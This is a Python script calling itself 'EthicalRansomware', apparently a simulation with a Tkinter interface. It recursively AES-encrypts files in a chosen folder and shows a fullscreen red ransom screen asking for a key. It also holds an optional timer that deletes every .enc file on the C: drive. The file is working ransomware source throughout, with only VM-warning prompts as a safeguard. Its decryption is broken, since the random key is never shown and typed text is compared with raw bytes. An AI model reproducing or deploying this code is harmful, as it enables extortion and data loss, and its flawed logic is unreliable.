import os
import tkinter as tk
from tkinter import messagebox
import hashlib
import random
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import padding
import time
import threading


class EthicalRansomware:
    def __init__(self, key_size=32, iv_size=16, show_hash=False, timer_constant=False):
        self.key_size = key_size  # AES 256-bit encryption
        self.iv_size = iv_size    # AES 128-bit IV
        self.show_hash = show_hash  # Whether to show the encryption key hash
        self.timer_constant = timer_constant  # Whether to use timer for decryption
        self.key = os.urandom(self.key_size)
        self.iv = os.urandom(self.iv_size)
        self.start_time = None  # Timer for decryption timeout

    def encrypt_file(self, file_path):
        """Encrypt a single file."""
        if self.is_ransomware(file_path) or self.is_system_file(file_path):
            print(f"Skipping file: {file_path}")
            return  # Skip encrypting the ransomware script and system files

        with open(file_path, 'rb') as f:
            data = f.read()

        # Pad the data to be a multiple of AES block size
        padder = padding.PKCS7(128).padder()
        padded_data = padder.update(data) + padder.finalize()

        # AES encryption in CBC mode
        cipher = Cipher(algorithms.AES(self.key), modes.CBC(self.iv), backend=default_backend())
        encryptor = cipher.encryptor()
        encrypted_data = encryptor.update(padded_data) + encryptor.finalize()

        # Save encrypted data to new file with ".enc" extension
        encrypted_file_path = file_path + '.enc'
        with open(encrypted_file_path, 'wb') as f:
            f.write(self.iv + encrypted_data)  # Store IV with encrypted data
        print(f"Encrypted file saved as: {encrypted_file_path}")

    def decrypt_file(self, file_path):
        """Decrypt a single file."""
        with open(file_path, 'rb') as f:
            iv = f.read(self.iv_size)  # Extract IV
            encrypted_data = f.read()

        # AES decryption in CBC mode
        cipher = Cipher(algorithms.AES(self.key), modes.CBC(iv), backend=default_backend())
        decryptor = cipher.decryptor()
        decrypted_data = decryptor.update(encrypted_data) + decryptor.finalize()

        # Unpad the decrypted data
        unpadder = padding.PKCS7(128).unpadder()
        unpadded_data = unpadder.update(decrypted_data) + unpadder.finalize()

        # Save decrypted data to original file (remove the ".enc" extension)
        decrypted_file_path = file_path.replace('.enc', '')
        with open(decrypted_file_path, 'wb') as f:
            f.write(unpadded_data)
        print(f"Decrypted file saved as: {decrypted_file_path}")

    def is_ransomware(self, file_path):
        """Check if the file is the ransomware script itself to avoid self-encryption."""
        return os.path.basename(file_path) == os.path.basename(__file__)

    def is_system_file(self, file_path):
        """Check if the file is a system file (critical OS files) to avoid encryption."""
        system_directories = [
            "C:\\Windows",
            "C:\\Program Files",
            "C:\\Program Files (x86)",
            "C:\\Users",
            "C:\\System Volume Information"
        ]
        for directory in system_directories:
            if file_path.startswith(directory):
                return True
        return False

    def traverse_and_encrypt(self, start_path):
        """Traverse the folder structure and encrypt files."""
        for root, dirs, files in os.walk(start_path):
            for file_name in files:
                file_path = os.path.join(root, file_name)
                self.encrypt_file(file_path)  # Encrypt each file

    def traverse_and_decrypt(self, start_path):
        """Traverse the folder structure and decrypt files."""
        for root, dirs, files in os.walk(start_path):
            for file_name in files:
                file_path = os.path.join(root, file_name)
                if file_path.endswith('.enc'):
                    self.decrypt_file(file_path)  # Decrypt encrypted files

    def start_timer(self):
        """Start the timer for decryption. If it expires, destroy encrypted files."""
        if self.timer_constant:
            self.start_time = time.time()  # Record start time
            threading.Timer(300, self.timer_expired).start()  # 5-minute timer

    def timer_expired(self):
        """Called when the timer expires (5 minutes). Deletes encrypted files."""
        elapsed_time = time.time() - self.start_time
        if elapsed_time >= 300:  # 5 minutes expired
            print("Too late! Files are destroyed.")
            self.destroy_encrypted_files()
            messagebox.showerror("Too Late", "You took too long. The encrypted files have been destroyed!")

    def destroy_encrypted_files(self):
        """Delete all encrypted files with .enc extension."""
        for root, dirs, files in os.walk("C:\\"):
            for file_name in files:
                if file_name.endswith('.enc'):
                    file_path = os.path.join(root, file_name)
                    os.remove(file_path)  # Delete encrypted files
                    print(f"Deleted encrypted file: {file_path}")


# GUI setup
def show_ransomware_gui():
    def encrypt_action():
        folder_path = folder_entry.get()
        ransomware.traverse_and_encrypt(folder_path)
        ransomware.start_timer()  # Start the decryption timer
        messagebox.showinfo("Success", "All files encrypted!")

    def decrypt_action():
        entered_key = key_entry.get().encode()
        if entered_key == ransomware.key:
            folder_path = folder_entry.get()
            ransomware.traverse_and_decrypt(folder_path)
            messagebox.showinfo("Success", "Files decrypted!")
        else:
            messagebox.showerror("Error", "Incorrect key!")

    # Show confirmation message box before triggering the ransomware
    if messagebox.askyesno("Ransomware?", "I recommend using a VM. Continue?"):
        if messagebox.askyesno("Final Confirmation", "It will actually do things. Proceed?"):
            # Create ransomware instance with default TimerConstant=False
            global ransomware
            ransomware = EthicalRansomware(show_hash=True, timer_constant=False)

            # Tkinter setup for GUI
            root = tk.Tk()
            root.title("Ransomware Simulation")
            root.geometry("1920x1080")
            root.configure(bg="red")
            root.attributes("-fullscreen", True)

            # Warning label
            label = tk.Label(root, text="Your computer is encrypted\nFigure the code out to decrypt it", 
                             font=("Arial", 40), fg="white", bg="red", justify="center")
            label.pack(pady=100)

            # Key input and buttons
            key_label = tk.Label(root, text="Enter Decryption Key:", font=("Arial", 20), fg="white", bg="red")
            key_label.pack(pady=20)
            key_entry = tk.Entry(root, font=("Arial", 20))
            key_entry.pack(pady=20)

            # Decrypt button
            decrypt_button = tk.Button(root, text="Decrypt", font=("Arial", 20), command=decrypt_action)
            decrypt_button.pack(pady=20)

            # Folder path input and button for encryption
            folder_label = tk.Label(root, text="Enter folder path to encrypt:", font=("Arial", 20), fg="white", bg="red")
            folder_label.pack(pady=20)
            folder_entry = tk.Entry(root, font=("Arial", 20))
            folder_entry.pack(pady=20)

            encrypt_button = tk.Button(root, text="Encrypt", font=("Arial", 20), command=encrypt_action)
            encrypt_button.pack(pady=20)

            root.mainloop()


if __name__ == "__main__":
    show_ransomware_gui()
